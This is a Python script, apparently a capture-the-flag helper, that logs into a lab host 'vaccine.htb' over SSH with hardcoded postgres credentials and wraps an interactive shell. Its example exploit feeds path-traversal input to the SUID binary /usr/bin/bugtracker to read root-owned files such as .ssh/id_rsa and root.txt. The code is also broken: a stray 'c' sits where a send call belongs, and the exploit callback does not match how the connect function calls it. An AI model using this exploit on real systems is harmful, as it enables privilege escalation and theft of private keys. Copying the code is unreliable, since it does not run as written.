
import paramiko
import time
from paramiko import Channel


PROMPT = "cat-ssh> "
def example_exploit(channel: Channel):
    vuln_bin = "/usr/bin/bugtracker"
    payloads = [".ssh/id_rsa", "flag.txt", "root.txt"]
    root_prefix = "../"
    
    
    for file_path in payloads:
        
        print(f"executing {vuln_bin} ")
        channel.send(vuln_bin + "\n")
        first_output = channel.recv(2048).decode()
        print(first_output)
        
        payload = root_prefix + file_path + "\n"
        
        channel.send(payload)
        
        result: str = channel.recv(4096).decode()
        print(result)
        
        if(not result.__contains__("No such file or directory")):
            print("Found flag:\n" + result)
            break
            
 
 
 
def connect_with_ssh(hostname, username, password, action):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh_client.connect(hostname, username=username, password=password)

        channel = ssh_client.invoke_shell()
        
        

        print("[+] connected successfully to target")
        
        return action(channel, ssh_client)
        
    except Exception as e:
        print(f"An error occurred: {e}")
        raise e 
    finally:
        # Close the SSH connection
        ssh_client.close()
    


def read_command_output(channel: Channel):
    output = ""
      # Continuously read from the channel until the prompt appears again
    while True:
        try:
            part = channel.recv(1024).decode()
            output += part

            # Check if the output ends with the prompt
            if output.endswith(PROMPT):
                break

        except Exception as e:
            print(f"Error while reading from channel: {e}")
            break

        # Optional: Add a small delay to avoid busy waiting
        time.sleep(0.1)

    # Clean up the output by removing the prompt
    output = output[:-len(PROMPT)]
    print(output)
       
       
def run_ssh_interactive_shell(channel: Channel):


    print("Connected to the server. Type your commands below.")

    
    
    print(channel.recv(1024))

    while True:
        command = input(PROMPT)
                    
        if command.lower() in ['exit', 'quit']:
            break
        
        
        c
        
        read_command_output(channel)




# Define your connection parameters
hostname = 'vaccine.htb'  # Replace with the target IP
username = 'postgres'    # Replace with your SSH username
password = 'P@s5w0rd!'    # Replace with your SSH password



"""
Start the interactive shell or custom exploit: 
    - the 'connect_with_ssh' work with dependency injection (means that you recived the ssh channel as argument in your callback)
    - provide the callback  
    - use the ssh client inside it
    
it super simple template :)
"""
connect_with_ssh(hostname, username, password, run_ssh_interactive_shell)